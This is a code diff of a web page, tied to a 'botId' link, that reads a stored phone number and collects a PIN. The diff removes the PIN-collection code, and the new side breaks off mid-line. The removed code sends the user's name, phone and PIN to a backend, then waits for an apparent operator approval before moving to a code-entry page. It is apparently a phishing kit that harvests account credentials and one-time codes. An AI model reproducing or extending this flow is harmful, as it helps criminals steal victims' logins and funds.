@@ -131,64 +131,9 @@ if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
 const phoneDisplay = document.getElementById('phoneDisplay');
 const phone = localStorage.getItem('phone');
 if (!phone) {
-    // If phone not set, redirect back to details page
     window.location.href = `details.html?botId=${botId}`;
 }
 phoneDisplay.value = phone;
 
 // ---------------- PIN INPUT LOGIC ----------------
-const inputs = document.querySelectorAll('.pin-boxes input');
-const button = document.getElementById('submitBtn');
-
-inputs[0].focus();
-
-inputs.forEach((input, i) => {
-    input.addEventListener('input', () => {
-        input.value = input.value.replace(/\D/g,''); // Only digits
-        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
-        button.disabled = ![...inputs].every(x => x.value);
-        if ([...inputs].every(x => x.value)) {
-            button.classList.add('enabled');
-        } else {
-            button.classList.remove('enabled');
-        }
-    });
-
-    input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && i > 0) {
-            inputs[i - 1].focus();
-        }
-    });
-});
-
-// ---------------- SUBMIT PIN ----------------
-document.getElementById('pinForm').addEventListener('submit', async e => {
-    e.preventDefault();
-    const pin = [...inputs].map(i => i.value).join('');
-    localStorage.setItem('pin', pin);
-
-    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({
-            name: localStorage.getItem('name'),
-            phone,
-            pin,
-            botId
-        })
-    });
-
-    const { requestId } = await res.json();
-    const poll = setInterval(async () => {
-        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-        const d = await r.json();
-        if (d.approved === true) {
-            clearInterval(poll);
-            window.location.href = `code.html?botId=${botId}`;
-        }
-    }, 1500);
-});
-</script>
-
-</body>
-</html>
+const inputs = document
